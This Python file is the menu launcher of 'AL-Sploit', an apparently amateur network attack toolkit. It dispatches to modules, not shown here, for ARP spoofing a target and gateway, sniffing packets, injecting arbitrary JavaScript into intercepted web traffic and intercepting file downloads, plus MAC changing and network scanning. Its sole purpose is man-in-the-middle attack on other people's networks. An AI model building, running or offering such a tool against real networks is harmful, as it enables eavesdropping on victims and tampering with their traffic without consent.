#!/usr/bin/python3
import spoof.arpspoofer as arpspoof

# import spoof.dnsspoofer as dnsspoof
import features.changemac as changemac
import networkscan.netscan as netscan
import sniffdata.sniff as sniff
import expweb.InjectJS as injectjs
import expweb.fintercept as fintersept
import threading
import time


def logo():
    return f"""\033[92m
    /\   | |        / ____|     | |     (_) |    | \033[95m Welcome to AL-Sploit \033[92m
   /  \  | |  _____| (___  _ __ | | ___  _| |_   | \033[95m Version : {0.2} \033[92m
  / /\ \ | | |______\___ \| '_ \| |/ _ \| | __|  | \033[95m https://github.com/alrocks29\033[92m
 / ____ \| |____    ____) | |_) | | (_) | | |_   | \033[95m Author : Alrocks \033[92m
/_/    \_\______|  |_____/| .__/|_|\___/|_|\__|   
                          | |                  
                          |_|  
\033[0m
    """


def run():
    current = "alsploit"
    while True:
        try:
            command = input("(" + current + ")" + ">> ")
            command = command.split(" ")

            if command[0] == "changemac":
                changemac.run_mac()

            if command[0] == "netscan":
                current = "netscan"
                command = input("(netscan) Enter IP Range >> ")
                command = command.split(" ")
                netscan.run_netscan(command[0])

            if command[0] == "arpspoof":
                currrent = "arpspoof"
                target_ip = input("(arpspoof) Enter Target IP >> ")
                gateway_ip = input("(arpspoof) Enter Gateway IP >> ")
                t1 = threading.Thread(target=arpspoof.arp_run, args=(target_ip, gateway_ip))
                t1.setDaemon(True)
                t1.start()

            if command[0] == "sniff":
                current = "sniff"
                print(changemac.get_interface())
                interface = input("(sniff) Choose Interface >> ")
                interface = interface.split(" ")
                t2 = threading.Thread(target=sniff.sniff_run, args=interface)
                t2.setDaemon(True)
                t2.start()

            if command[0] == "injectjs":
                current = "InjectJS"
                injection_code = input("(InjectJS) Javascript Code >>")
                injection_code = injection_code.split(" ")
                # print(injection_code)
                t3 = threading.Thread(target=injectjs.run_injectjs, args=(injection_code))
                t3.setDaemon(True)
                t3.start()

            if command[0] == "fintercept":
                current = "FileIntercept"
                fint_Add = input("(FileInterception) File Address >>")
                fint_Add = fint_Add.split(" ")
                # print(fint_Add)
                t4 = threading.Thread(target=fintersept.run_fintercept, args=(fint_Add))
                t4.setDaemon(True)
                t4.start()

            current = "alsploit"

        except KeyboardInterrupt:
            print("\nQuitting...............")
            current = "alsploit"
            break
        # print(result)


print(logo())
run()
